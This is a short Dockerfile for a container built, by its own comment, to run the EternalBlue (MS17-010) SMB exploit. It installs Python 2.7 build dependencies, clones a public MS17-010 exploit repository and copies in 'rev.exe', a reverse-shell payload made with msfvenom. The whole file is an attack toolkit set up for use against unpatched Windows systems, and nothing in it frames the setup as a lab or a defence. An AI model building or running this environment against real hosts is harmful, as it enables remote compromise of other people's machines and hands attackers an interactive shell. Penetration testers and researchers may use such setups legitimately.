# Simple container to run Eternal Blue

FROM python:2.7-alpine
RUN apk --update --no-cache add \
    git \
    zlib-dev \
    musl-dev \
    libc-dev \
    gcc \
    libffi-dev \
    openssl-dev && \
    rm -rf /var/cache/apk/*

# Make directory for all the things
RUN mkdir -p /opt/perpetual_melancholy
WORKDIR /opt/perpetual_melancholy

# Copy Python requirements file and install packages
COPY requirements.txt /opt/perpetual_melancholy
RUN pip install -r requirements.txt

# Clone the MS17-010 repo
RUN git clone https://github.com/helviojunior/MS17-010.git
WORKDIR /opt/perpetual_melancholy/MS17-010

# Copy across reverse shell created with msfvenom
COPY rev.exe /opt/perpetual_melancholy/MS17-010
